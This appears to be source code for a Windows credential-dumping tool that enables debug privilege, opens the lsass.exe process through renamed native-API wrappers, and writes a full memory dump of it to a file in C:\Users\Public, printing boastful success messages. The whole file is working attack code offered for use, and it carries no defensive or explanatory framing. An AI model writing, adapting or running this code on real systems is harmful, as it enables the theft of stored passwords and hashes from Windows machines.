#define _CRT_SECURE_NO_WARNINGS // Suppress security warnings

#include <windows.h>
#include <tchar.h>
#include <iostream>
#include <tlhelp32.h>
#include <DbgHelp.h>
#include <thread>
#include <chrono>
#include "sysMDWD.h"
#include "DebugHelper.h"
#include <ntstatus.h>

using namespace std;

bool sysMDWD()
{
	//variables for NtOpenProcess()
	HANDLE hLsass = NULL;
	OBJECT_ATTRIBUTES objAttr = { 0 };
	UNICODE_STRING PN;
	CLIENT_ID clientId;


	WCHAR* procname = (WCHAR*)"lsass.exe";
	PN.Buffer = procname;
	PN.Length = wcslen(procname) * sizeof(WCHAR);
	PN.MaximumLength = PN.Length + sizeof(WCHAR);
	clientId.UniqueProcess = HANDLE(getPID());
	clientId.UniqueThread = NULL;

	EnableDebugPrivilege();


	// obtain handle from lsass.exe via NtOpenProcess()
	NTSTATUS status = ZOP(&hLsass, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &objAttr, &clientId);

	if (status != STATUS_SUCCESS)
	{
		std::cout << "[-]NtOpenProcess failed." << endl;
		return false;
	}

	// Get the handle's file name of the LSASS process
	TCHAR szFileName[MAX_PATH];
	DWORD dwSize = MAX_PATH;

	_stprintf_s(szFileName, MAX_PATH, _T("C:\\Users\\Public\\sysMDWD.file"));

	HANDLE hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		std::cerr << "Failed to create file." << std::endl;
		return false;
	}


	std::this_thread::sleep_for(std::chrono::seconds(5));

	//Dump lsass.exe using MiniDumpWriteDump()
	BOOL bRes = MiniDumpWriteDump(hLsass, GetProcessId(hLsass), hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);

	ZOC(hFile);
	ZOC(hLsass);

	if (!bRes)
	{
		cout << "[-]D3MPSEC has failed." << endl;
		return false;
	}
	cout << "[+] Great running with admin privileges." << endl;
	cout << "[+] EnableDebugPrivileges." << endl;
	cout << "[+] Obtain handle from lsass.exe via ZwOpenProcess()." << endl;
	cout << "[+] Dump lsass.exe using MiniDumpWriteDump()." << endl;
	cout << "[+] Enjoy the sysMDWD.file.)" << endl;
	return true;
}
